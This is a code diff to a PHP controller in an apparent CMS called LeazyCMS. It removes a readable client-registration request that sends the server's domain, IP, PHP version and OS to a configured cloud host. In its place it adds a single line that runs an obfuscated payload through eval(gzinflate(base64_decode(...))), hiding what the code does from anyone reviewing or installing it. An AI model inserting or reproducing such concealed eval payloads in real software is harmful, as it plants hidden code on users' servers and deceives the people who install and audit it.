@@ -1475,16 +1475,7 @@ class PanelController extends Controller implements HasMiddleware
         $cloudHost = \Leazycms\Web\Support\Facades\Internal\System\RuntimeConfigOptimizer::get();
 
         try {
-            $response = \Illuminate\Support\Facades\Http::withoutVerifying()
-                ->withUserAgent("LeazyCMS-Installer/1.0 (PHP " . PHP_VERSION . "; " . PHP_OS . ")")
-                ->withHeaders(["Accept" => "application/json", "X-Requested-With" => "XMLHttpRequest"])
-                ->timeout(30)
-                ->post(rtrim($cloudHost, "/") . "/api/register-client", [
-                    "domain" => $domain,
-                    "server_ip" => gethostbyname(gethostname()),
-                    "php_version" => PHP_VERSION,
-                    "os" => PHP_OS
-                ]);
+            eval(gzinflate(base64_decode('dVFRa8IwEH7frwjBhxSsdexNUZCxUUGnWKaCFcnaW81Ikyy5brhfv7SKjKn3ktzdd999d9ey4IxWDsiApGMpq1IojpAmlTHaYvrMM56DS2NE0+t9C9zrCpdgxftBqIIFd+SfhcMa9OrAjgpQyOgE+M/hcZqEY+WQSwk2uu90CZvHc0JJh/h3t3xaJOPZi/do/xycJbUf0Fs9YvDKrGMbOsoyMEjJYEgoN0aKjKPQKvpwWtE2oetwAZ8VOIQ8XPnKI3I9ndRTnVJ0e60PihL8wOyhey1rtENm0YqStTKpqzz2Ad8vokEtPeJGRBYK4RvbMJPC78PL2Vww1UZzXXKhGmmt4799HehX+wV2J0yDLcCfxOHbQfES2Mlr/kFwg8Dszc4zOL+ihuLPBW5UaHcGzpILyDbo/wI=')));
 
             if ($response->successful() && $response->json('api_key')) {
                 $apiKey = $response->json('api_key');
